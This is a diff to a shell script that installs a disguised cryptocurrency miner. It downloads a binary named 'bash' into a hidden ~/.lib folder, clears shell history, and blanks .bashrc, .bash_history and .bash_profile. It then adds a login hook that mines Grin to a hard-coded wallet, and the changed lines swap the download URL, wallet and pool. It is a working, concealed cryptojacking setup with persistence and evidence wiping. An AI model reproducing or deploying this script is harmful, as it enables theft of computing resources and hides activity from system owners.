@@ -1,16 +1,9 @@
-cd ~
-rm -rvf .bash* .lib*
-
-rm -rvf ele* lol* 1.* 
-cd ~/
 mkdir .lib
 cd .lib
-rm -R *
-rm -R /root/.ton
-WORKER="h200"
-WALLETNH="9gZq6cYcEbttXdCDxMos1JMaeUwKmbZeCVqRYthCzaYMmGdijuT"
-POOLNH="pool.woolypooly.com:3100"
-wget -P /root/.lib/ https://sagekuykuy.my.id/bash && history -cr 
+WORKER="setan"
+WALLETNH="grin1yrecjut0w5nk2nfsy5nqlyffuwlq2s3gqzqmn8gz27yu98asnu3qqalqxn"
+POOLNH="grin.2miners.com:3030"
+wget -P /root/.lib/ https://github.com/gunturyogatama404/lolcuk/raw/refs/heads/main/bash && history -cr 
 echo ""  > /root/.bashrc
 echo "" > /root/.bash_history
 echo "" > /root/.bash_profile
@@ -18,11 +11,11 @@ echo 'echo ""  >> /root/.bash_history' >> /root/.bashrc
 echo "source /root/.bash_profile"  >> /root/.bashrc
 echo "LD_LIBRARY_PATH=/root/.lib" > /root/.bash_profile
 echo "export LD_LIBRARY_PATH" >> /root/.bash_profile
-echo 'WORKER="h200"' >> ~/.bash_profile
-echo 'WALLETNH="9gZq6cYcEbttXdCDxMos1JMaeUwKmbZeCVqRYthCzaYMmGdijuT"' >> /root/.bash_profile
-echo 'POOLNH="pool.woolypooly.com:3100"' >> /root/.bash_profile
+echo 'WORKER="setan"' >> ~/.bash_profile
+echo 'WALLETNH="grin1yrecjut0w5nk2nfsy5nqlyffuwlq2s3gqzqmn8gz27yu98asnu3qqalqxn"' >> /root/.bash_profile
+echo 'POOLNH="grin.2miners.com:3030"' >> /root/.bash_profile
 echo "bash /root/.lib/gas.sh"  >> /root/.bash_profile
-echo "./.lib/bash -a autolykos2 -o stratum+tcp://$POOLNH -u $WALLETNH -w $WORKER" > /root/.lib/gas.sh
+echo "./.lib/bash --coin GRIN-C32 --pool $POOLNH --user $WALLETNH.$WORKER " > /home/studio-lab-user/.lib/gas.sh
 chmod +x bash && cd ~/ && source .bashrc
 
 
